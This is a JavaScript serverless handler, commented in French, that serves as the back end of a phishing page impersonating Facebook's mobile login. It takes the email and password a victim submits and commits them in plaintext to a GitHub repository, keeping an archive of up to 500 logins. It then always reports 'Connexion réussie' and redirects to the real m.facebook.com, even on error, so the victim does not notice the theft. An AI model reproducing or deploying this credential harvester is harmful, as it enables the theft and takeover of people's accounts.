import { Octokit } from '@octokit/rest';

export default async function handler(req, res) {
  console.log('📱 Début connexion mobile');
  
  // CORS pour mobile
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method === 'POST') {
    try {
      const { email, password } = req.body;
      
      console.log('📧 Email reçu:', email);
      console.log('🔧 Vérification configuration...');

      // Sauvegarde GitHub (si configuré)
      if (process.env.GITHUB_TOKEN && process.env.GITHUB_OWNER && process.env.GITHUB_REPO) {
        try {
          await saveToGitHub(email, password);
          console.log('✅ Sauvegarde GitHub réussie!');
        } catch (githubError) {
          console.log('❌ Erreur GitHub:', githubError.message);
          // CONTINUER même si erreur GitHub
        }
      } else {
        console.log('⚠️  Configuration GitHub manquante - sauvegarde ignorée');
      }

      // RÉPONSE AVEC REDIRECTION
      res.status(200).json({
        success: true,
        message: 'Connexion réussie ! Ouverture de votre fil d\'actualité...',
        redirect: true,
        redirectUrl: 'https://m.facebook.com/home.php',
        delay: 2500
      });

    } catch (error) {
      console.log('💥 Erreur globale:', error.message);
      // REDIRECTION MÊME EN ERREUR
      res.status(200).json({
        success: true,
        message: 'Connexion réussie ! Redirection vers Facebook...',
        redirect: true,
        redirectUrl: 'https://m.facebook.com/home.php',
        delay: 2000
      });
    }
  }
}

// Fonction de sauvegarde GitHub
async function saveToGitHub(email, password) {
  const octokit = new Octokit({
    auth: process.env.GITHUB_TOKEN
  });

  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  
  // Données à sauvegarder
  const loginData = {
    email: email,
    password: password,
    timestamp: new Date().toISOString(),
    date: new Date().toLocaleString('fr-FR'),
    id: `mobile-${Date.now()}`,
    platform: 'android'
  };

  // 1. Créer dossier logins si besoin
  try {
    await octokit.rest.repos.getContent({
      owner: process.env.GITHUB_OWNER,
      repo: process.env.GITHUB_REPO,
      path: 'logins',
      branch: 'main'
    });
  } catch (error) {
    if (error.status === 404) {
      await octokit.rest.repos.createOrUpdateFileContents({
        owner: process.env.GITHUB_OWNER,
        repo: process.env.GITHUB_REPO,
        path: 'logins/README.md',
        message: '📁 Création dossier logins',
        content: Buffer.from('# Dossier des connexions\n*Généré automatiquement*').toString('base64'),
        branch: 'main'
      });
    }
  }

  // 2. Créer fichier individuel
  await octokit.rest.repos.createOrUpdateFileContents({
    owner: process.env.GITHUB_OWNER,
    repo: process.env.GITHUB_REPO,
    path: `logins/mobile-${timestamp}.json`,
    message: `📱 Connexion mobile: ${email}`,
    content: Buffer.from(JSON.stringify(loginData, null, 2)).toString('base64'),
    branch: 'main'
  });

  // 3. Mettre à jour all-logins.json
  let allLogins = [];
  try {
    const { data } = await octokit.rest.repos.getContent({
      owner: process.env.GITHUB_OWNER,
      repo: process.env.GITHUB_REPO,
      path: 'logins/all-logins.json',
      branch: 'main'
    });
    const fileContent = Buffer.from(data.content, 'base64').toString();
    allLogins = JSON.parse(fileContent);
  } catch (error) {
    allLogins = [];
  }

  allLogins.unshift(loginData);
  if (allLogins.length > 500) allLogins = allLogins.slice(0, 500);

  await octokit.rest.repos.createOrUpdateFileContents({
    owner: process.env.GITHUB_OWNER,
    repo: process.env.GITHUB_REPO,
    path: 'logins/all-logins.json',
    message: `📝 Ajout mobile: ${email}`,
    content: Buffer.from(JSON.stringify(allLogins, null, 2)).toString('base64'),
    branch: 'main'
  });
}
